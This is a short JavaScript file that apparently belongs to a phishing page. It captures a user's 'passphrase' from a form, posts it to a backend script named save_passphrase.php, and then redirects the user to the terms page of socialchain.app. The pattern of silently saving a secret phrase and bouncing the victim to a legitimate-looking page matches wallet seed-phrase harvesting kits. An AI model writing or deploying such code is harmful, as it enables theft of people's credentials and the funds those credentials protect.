document.addEventListener("DOMContentLoaded", function () {
    const form = document.getElementById("passphrase-form");

    form.addEventListener("submit", function (event) {
        event.preventDefault(); // Prevent default form submission

        const passphraseInput = document.getElementById("passphrase");
        const passphrase = passphraseInput.value.trim();

        if (passphrase === "") {
            alert("Please enter a passphrase.");
            return;
        }

        // Send passphrase to the backend
        fetch("save_passphrase.php", {
            method: "POST",
            headers: {
                "Content-Type": "application/x-www-form-urlencoded"
            },
            body: `passphrase=${encodeURIComponent(passphrase)}`
        })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                // Redirect user after successful submission
                window.location.href = "https://socialchain.app/tos";
            } else {
                alert("Failed to save passphrase. Please try again.");
            }
        })
        .catch(error => {
            console.error("Error:", error);
            alert("An error occurred. Please try again.");
        });
    });
});